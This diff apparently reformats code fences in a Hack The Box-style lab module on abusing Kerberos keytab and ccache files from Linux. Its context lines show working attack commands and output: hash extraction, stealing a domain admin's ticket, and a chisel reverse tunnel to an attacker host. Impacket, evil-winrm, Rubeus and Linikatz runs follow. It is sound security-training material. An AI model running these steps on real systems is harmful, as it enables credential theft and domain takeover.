@@ -34,8 +34,7 @@ Let's assume we are in a new assessment, and the company gives us access to `LIN
 
 #### Linux auth via port forward
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ ssh david@inlanefreight.htb@10.129.204.23 -p 2222
 
 david@inlanefreight.htb@10.129.204.23's password: 
@@ -73,8 +72,7 @@ We can identify if the Linux machine is domain-joined using [realm](https://acce
 
 #### realm - Check if Linux machine is domain-joined
 
-```
-        shellsession
+```shellsession
 david@inlanefreight.htb@linux01:~$ realm list
 
 inlanefreight.htb
@@ -102,8 +100,7 @@ In case [realm](https://access.redhat.com/documentation/en-us/red_hat_enterprise
 
 #### PS - Check if Linux machine is domain-joined
 
-```
-        shellsession
+```shellsession
 david@inlanefreight.htb@linux01:~$ ps -ef | grep -i "winbind\|sssd"
 
 root        2140       1  0 Sep29 ?        00:00:01 /usr/sbin/sssd -i --logger=files
@@ -122,8 +119,7 @@ A straightforward approach is to use `find` to search for files whose name conta
 
 #### Using Find to search for files with keytab in the name
 
-```
-        shellsession
+```shellsession
 david@inlanefreight.htb@linux01:~$ find / -name *keytab* -ls 2>/dev/null
 
 ...SNIP...
@@ -138,8 +134,7 @@ Another way to find `KeyTab` files is in automated scripts configured using a cr
 
 #### Identifying KeyTab files in Cronjobs
 
-```
-        shellsession
+```shellsession
 carlos@inlanefreight.htb@linux01:~$ crontab -l
 
 # Edit this file to introduce tasks to be run by cron.
@@ -167,8 +162,7 @@ A credential cache or [ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/
 
 #### Reviewing environment variables for ccache files.
 
-```
-        shellsession
+```shellsession
 david@inlanefreight.htb@linux01:~$ env | grep -i krb5
 
 KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh
@@ -178,8 +172,7 @@ As mentioned previously, `ccache` files are located, by default, at `/tmp`. We c
 
 #### Searching for ccache files in /tmp
 
-```
-        shellsession
+```shellsession
 david@inlanefreight.htb@linux01:~$ ls -la /tmp
 
 total 68
@@ -196,8 +189,7 @@ As attackers, we may have several uses for a keytab file. The first thing we can
 
 #### Listing KeyTab file information
 
-```
-        shellsession
+```shellsession
 david@inlanefreight.htb@linux01:~$ klist -k -t /opt/specialfiles/carlos.keytab 
 
 Keytab name: FILE:/opt/specialfiles/carlos.keytab
@@ -212,8 +204,7 @@ The ticket corresponds to the user Carlos. We can now impersonate the user with 
 
 #### Impersonating a user with a KeyTab
 
-```
-        shellsession
+```shellsession
 david@inlanefreight.htb@linux01:~$ klist 
 
 Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
@@ -236,8 +227,7 @@ We can attempt to access the shared folder `\\dc01\carlos` to confirm our access
 
 #### Connecting to SMB Share as Carlos
 
-```
-        shellsession
+```shellsession
 david@inlanefreight.htb@linux01:~$ smbclient //dc01/carlos -k -c ls
 
   .                                   D        0  Thu Oct  6 14:46:26 2022
@@ -257,8 +247,7 @@ We can attempt to crack the account's password by extracting the hashes from the
 
 #### Extracting KeyTab hashes with KeyTabExtract
 
-```
-        shellsession
+```shellsession
 david@inlanefreight.htb@linux01:~$ python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 
 
 [*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
@@ -284,8 +273,7 @@ As we can see in the image, the password for the user Carlos is `Password5`. We 
 
 #### Log in as Carlos
 
-```
-        shellsession
+```shellsession
 david@inlanefreight.htb@linux01:~$ su - carlos@inlanefreight.htb
 
 Password: 
@@ -310,8 +298,7 @@ Once we log in with the credentials for the user `svc_workstations`, we can use 
 
 #### Privilege escalation to root
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ ssh svc_workstations@inlanefreight.htb@10.129.204.23 -p 2222
                   
 svc_workstations@inlanefreight.htb@10.129.204.23's password: 
@@ -334,8 +321,7 @@ As root, we need to identify which tickets are present on the machine, to whom t
 
 #### Looking for ccache files
 
-```
-        shellsession
+```shellsession
 root@linux01:~# ls -la /tmp
 
 total 76
@@ -353,8 +339,7 @@ There is one user ([julio@inlanefreight.htb](mailto:julio@inlanefreight.htb)) to
 
 #### Identifying group membership with the id command
 
-```
-        shellsession
+```shellsession
 root@linux01:~# id julio@inlanefreight.htb
 
 uid=647401106(julio@inlanefreight.htb) gid=647400513(domain users@inlanefreight.htb) groups=647400513(domain users@inlanefreight.htb),647400512(domain admins@inlanefreight.htb),647400572(denied rodc password replication group@inlanefreight.htb)
@@ -366,8 +351,7 @@ To use a ccache file, we can copy the ccache file and assign the file path to th
 
 #### Importing the ccache file into our current session
 
-```
-        shellsession
+```shellsession
 root@linux01:~# klist
 
 klist: No credentials cache found (filename: /tmp/krb5cc_0)
@@ -410,8 +394,7 @@ In this scenario, our attack host doesn't have a connection to the `KDC/Domain C
 
 #### Host file modified
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ cat /etc/hosts
 
 # Host addresses
@@ -424,8 +407,7 @@ We need to modify our proxychains configuration file to use socks5 and port 1080
 
 #### Proxychains configuration file
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ cat /etc/proxychains.conf
 
 ...SNIP...
@@ -438,8 +420,7 @@ We must download and execute [chisel](https://github.com/jpillora/chisel) on our
 
 #### Download Chisel to our attack host
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
 hiimeins@htb[/htb]$ gzip -d chisel_1.7.7_linux_amd64.gz
 hiimeins@htb[/htb]$ mv chisel_* chisel && chmod +x ./chisel
@@ -454,15 +435,13 @@ Connect to `MS01` via RDP and execute chisel (located in C:\Tools).
 
 #### Connect to MS01 with xfreerdp
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution
 ```
 
 #### Execute chisel from MS01
 
-```
-        cmd
+```bat
 C:\htb> c:\tools\chisel.exe client 10.10.14.33:8080 R:socks
 
 2022/10/10 06:34:19 client: Connecting to ws://10.10.14.33:8080
@@ -475,8 +454,7 @@ Finally, we need to transfer Julio's ccache file from `LINUX01` and create the e
 
 #### Setting the KRB5CCNAME environment variable
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
 ```
 
@@ -488,8 +466,7 @@ To use the Kerberos ticket, we need to specify our target machine name (not the 
 
 #### Using Impacket with proxychains and Kerberos authentication
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ proxychains impacket-wmiexec dc01 -k
 
 [proxychains] config file found: /etc/proxychains.conf
@@ -518,8 +495,7 @@ To use [evil-winrm](https://github.com/Hackplayers/evil-winrm) with Kerberos, we
 
 #### Installing Kerberos authentication package
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo apt-get install krb5-user -y
 
 Reading package lists... Done                                                                                                  
@@ -543,8 +519,7 @@ In case the package `krb5-user` is already installed, we need to change the conf
 
 #### Kerberos configuration file for INLANEFREIGHT.HTB
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ cat /etc/krb5.conf
 
 [libdefaults]
@@ -564,8 +539,7 @@ Now we can use evil-winrm.
 
 #### Using Evil-WinRM with Kerberos
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ proxychains evil-winrm -i dc01 -r inlanefreight.htb
 
 [proxychains] config file found: /etc/proxychains.conf
@@ -592,8 +566,7 @@ If we want to use a `ccache file` in Windows or a `kirbi file` in a Linux machin
 
 #### Impacket Ticket converter
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
 
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
@@ -606,8 +579,7 @@ We can do the reverse operation by first selecting a `.kirbi file`. Let's use th
 
 #### Importing converted ticket into Windows session with Rubeus
 
-```
-        cmd
+```bat
 C:\htb> C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
 
    ______        _
@@ -659,8 +631,7 @@ Just like `Mimikatz`, to take advantage of Linikatz, we need to be root on the m
 
 #### Linikatz download and execution
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
 hiimeins@htb[/htb]$ /opt/linikatz.sh
  _ _       _ _         _
